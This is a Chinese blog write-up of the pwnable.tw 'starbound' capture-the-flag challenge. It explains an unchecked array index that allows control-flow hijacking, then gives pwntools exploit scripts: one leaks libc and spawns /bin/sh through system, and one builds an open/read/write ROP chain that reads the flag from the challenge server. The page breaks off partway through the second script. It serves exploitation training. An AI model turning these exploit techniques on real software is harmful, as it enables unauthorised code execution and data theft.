@@ -1,0 +1,359 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="源码量很大，但漏洞点很明显">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw之starbound">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2021/10/02/starbound/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="源码量很大，但漏洞点很明显">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-10-02T13:42:26.000Z">
+<meta property="article:modified_time" content="2021-10-02T13:45:12.683Z">
+<meta property="article:author" content="blingbling">
+<meta name="twitter:card" content="summary"><title>pwnable.tw之starbound | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2021/10/02/starbound/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">pwnable.tw之starbound</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-10-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-10-02</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="pwnable-tw之starbound"   >
+          <a href="#pwnable-tw之starbound" class="heading-link"><i class="fas fa-link"></i></a><a href="#pwnable-tw之starbound" class="headerlink" title="pwnable.tw之starbound"></a>pwnable.tw之starbound</h1>
+      <p>题目二进制文件：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pwnable.tw/static/chall/starbound" >starbound</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="漏洞分析"   >
+          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>
+      <p>以下是starbound的main函数，v3是用户输入的值，被用作数组index而未提前做检查，因此存在数组越界漏洞。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_805817C(<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !readn(nptr, <span class="number">0x100</span>u) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = strtol(nptr, <span class="number">0u</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))dword_8058154[v3])();</span><br><span class="line">  &#125;</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>dword_8058154是bss段的地址，这附近存放了许多函数指针。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_main_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n-+STARBOUND v1.0+-&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  0. Exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. Info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. Move&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. View&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. Tools&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  5. Kill&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  6. Settings&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  7. Multiplayer&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">0</span>; result &lt;= <span class="number">9</span>; ++result )</span><br><span class="line">    dword_8058154[result] = (<span class="keyword">int</span>)cmd_nop;</span><br><span class="line">  dword_8058158 = (<span class="keyword">int</span>)cmd_info;</span><br><span class="line">  dword_805815C = (<span class="keyword">int</span>)cmd_move;</span><br><span class="line">  dword_8058160 = (<span class="keyword">int</span>)cmd_view;</span><br><span class="line">  dword_8058164 = (<span class="keyword">int</span>)cmd_build;</span><br><span class="line">  dword_8058168 = (<span class="keyword">int</span>)cmd_kill;</span><br><span class="line">  dword_805816C = (<span class="keyword">int</span>)cmd_settings;</span><br><span class="line">  dword_8058170 = (<span class="keyword">int</span>)cmd_multiplayer;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>考虑通过数组越界访问到一些恶意构造的函数指针，这样我们就能劫持控制流。</p>
+<p>继续分析程序分支，show_main_menu() —&gt; cmd_settings() —&gt; show_settings_menu() —&gt; cmd_set_name()中，byte_80580D0也是bss段的地址，且我们可以控制其内容。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_go_back</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dword_805817C = show_main_menu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_main_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n-+STARBOUND v1.0+-&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  0. Exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. Info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. Move&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. View&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. Tools&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  5. Kill&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  6. Settings&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  7. Multiplayer&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">0</span>; result &lt;= <span class="number">9</span>; ++result )</span><br><span class="line">    dword_8058154[result] = (<span class="keyword">int</span>)cmd_nop;</span><br><span class="line">  dword_8058158 = (<span class="keyword">int</span>)cmd_info;</span><br><span class="line">  dword_805815C = (<span class="keyword">int</span>)cmd_move;</span><br><span class="line">  dword_8058160 = (<span class="keyword">int</span>)cmd_view;</span><br><span class="line">  dword_8058164 = (<span class="keyword">int</span>)cmd_build;</span><br><span class="line">  dword_8058168 = (<span class="keyword">int</span>)cmd_kill;</span><br><span class="line">  dword_805816C = (<span class="keyword">int</span>)cmd_settings;</span><br><span class="line">  dword_8058170 = (<span class="keyword">int</span>)cmd_multiplayer;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_settings</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dword_805817C = show_settings_menu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_settings_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_80580CC )</span><br><span class="line">    cmd_view();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n-+STARBOUND v1.0: SETTINGS+-&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  0. Exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. Back&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. Name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. IP&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. Toggle View&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">0</span>; result &lt;= <span class="number">9</span>; ++result )</span><br><span class="line">    dword_8058154[result] = (<span class="keyword">int</span>)cmd_nop;</span><br><span class="line">  dword_8058158 = (<span class="keyword">int</span>)cmd_go_back;</span><br><span class="line">  dword_805815C = (<span class="keyword">int</span>)cmd_set_name;</span><br><span class="line">  dword_8058160 = (<span class="keyword">int</span>)cmd_set_ip;</span><br><span class="line">  dword_8058164 = (<span class="keyword">int</span>)cmd_set_autoview;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmd_set_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  result = readn(byte_80580D0, <span class="number">100u</span>);</span><br><span class="line">  *(_BYTE *)(result + <span class="number">0x80580CF</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>计算一下byte_80580D0与dword_8058154两者的距离，因此通过dword_8058154[-33]即可访问到byte_80580D0地址存放的内容。此时已实现控制流劫持。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0x8058154</span>-<span class="number">0x80580D0</span>)</span><br><span class="line"><span class="string">&#x27;0x84&#x27;</span></span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="漏洞利用"   >
+          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1>
+      <p>程序中：</p>
+<ul>
+<li>没有后门函数</li>
+<li>没有system或execve函数</li>
+<li>没有int 80或syscall指令</li>
+<li>没有“/bin/sh”字符串</li>
+<li>没有给libc</li>
+</ul>
+
+        <h2 id="方法1：泄露libc版本"   >
+          <a href="#方法1：泄露libc版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法1：泄露libc版本" class="headerlink" title="方法1：泄露libc版本"></a>方法1：泄露libc版本</h2>
+      <p>首先想到的是，通过泄露libc版本，进而执行one_gadget或构造system(“/bin/sh”)这种方法。</p>
+<p>exp如下，该方法在本地能成功。但是在泄露远程libc版本时，发现泄露不同函数会得到不同libc版本。猜测远程libc是特意改过的，无法用这种方法准确获得system函数在libc中的偏移，故本题放弃使用该方法。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_elf = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./starbound&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;chall.pwnable.tw&quot;,10202)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&quot;Landing ...&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x804A659 \n c&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 1、往byte_80580D0位置写入目的函数指针，这里选0x08048e48先调整一下栈空间，方便2的利用</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">name_e = p32(<span class="number">0x08048e48</span>) </span><br><span class="line"><span class="comment"># 0x08048e48 : add esp, 0x1c ; ret      </span></span><br><span class="line"><span class="comment"># 0x08048936 : add esp, 8 ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf_chk@plt 0x80489F0</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">io.sendline(name_e)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 2、根据此时栈空间的情况，构造了如下payload。当1中gadget执行完返回后，会执行puts(read@got)</span></span><br><span class="line"><span class="comment">### 然后再次返回到0x804A605(main开头)。此时泄露了read函数的真正地址，并拥有重新从main函数执行的能力</span></span><br><span class="line">payload = <span class="string">&#x27;-33\x00&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+p32(<span class="number">0x8048b90</span>)+p32(<span class="number">0x804A605</span>)+p32(<span class="number">0x8055054</span>)</span><br><span class="line"><span class="comment"># puts@plt 0x8048b90</span></span><br><span class="line"><span class="comment"># write@got 0x8055044  --</span></span><br><span class="line"><span class="comment"># puts@got 0x805509C</span></span><br><span class="line"><span class="comment"># read@got 0x8055054</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;!!!!read!!!!!&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line">libc_base = read_addr - libc_elf.symbols[<span class="string">&quot;read&quot;</span>] </span><br><span class="line">system_addr = libc_base + libc_elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;!!!!libc_base!!!!&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;!!!!system!!!!&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 3、劫持控制流以执行system(&quot; -33;/bin/sh\x00&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">name_e = p32(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">io.sendline(name_e)</span><br><span class="line">payload = <span class="string">&quot; -33;/bin/sh\x00&quot;</span>     <span class="comment"># 相当于命令注入。通过尝试，在-33前加入空格才能利用成功</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="方法2：ORW"   >
+          <a href="#方法2：ORW" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法2：ORW" class="headerlink" title="方法2：ORW"></a>方法2：ORW</h2>
+      <p>在程序got表中看了看，发现有正好有open、read、write三个函数！这正好可以构造orw！当然在不知flag目录的前提下有点难度，不过pwnable.tw的flag一般在/home/题目名/flag，所以这里取个巧。</p>
+<p>需要注意的是，ctf题目中，一般情况下程序中不会打开其他文件，因此进程只有0 1 2 (stdin，stdout，stderr)这三个文件描述符。因此，当我们使用open打开文件后，其fd一定是3。</p>
+<p>如果程序中打开了其他文件，依次尝试下4/5/6就行。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./starbound&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10202</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvuntil(&quot;Landing ...&quot;)</span></span><br><span class="line"><span class="comment"># # gdb.attach(io,&quot;b *0x804A659 \n c&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b open \n c&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span>(<span class="params">val1,val2</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    name_e = val1</span><br><span class="line">    io.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">    io.sendline(name_e)</span><br><span class="line">    payload = val2</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### open(&quot;/home/starbound/flag&quot;,0)</span></span><br><span class="line">val1 = p32(<span class="number">0x08048e48</span>)+<span class="string">&quot;/home/starbound/flag\x00&quot;</span></span><br><span class="line">val2 = <span class="string">&#x27;-33\x00&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+p32(<span class="number">0x8048970</span>)+p32(<span class="number">0x804A605</span>)+p32(<span class="number">0x80580D4</span>)+p32(<span class="number">0</span>)</span><br><span class="line">send_payload(val1,val2)</span><br><span class="line"></span><br><span class="line"><span class="comment">### read(3,0x80580F0,0x30)</span></span><br><span class="line">val1 = p32(<span class="number">0x08048e48</span>)</span><br><span class="line">val2 = <span class="string">&#x27;-33\x00&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+p32(<span class="number">0x8048A70</span>)+p32(<span class="number">0x804A605</span>)+p32(<span class="number">3</span>)+p32(<span class="number">0x80580F0</span>)+p32(<span class="number">0x30</span>)</span><br><span class="line">send_payload(val1,val2)</span><br><span class="line"></span><br><span class="line"><span class="comment">### write(1,0x8058F0,0x30)</span></span><br><span class="line">val1 = p32(<span class="number">0x08048e48</span>)</span><br><span class="line">val2 = <span class="string">&#x27;-33\x00&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+p32(<span 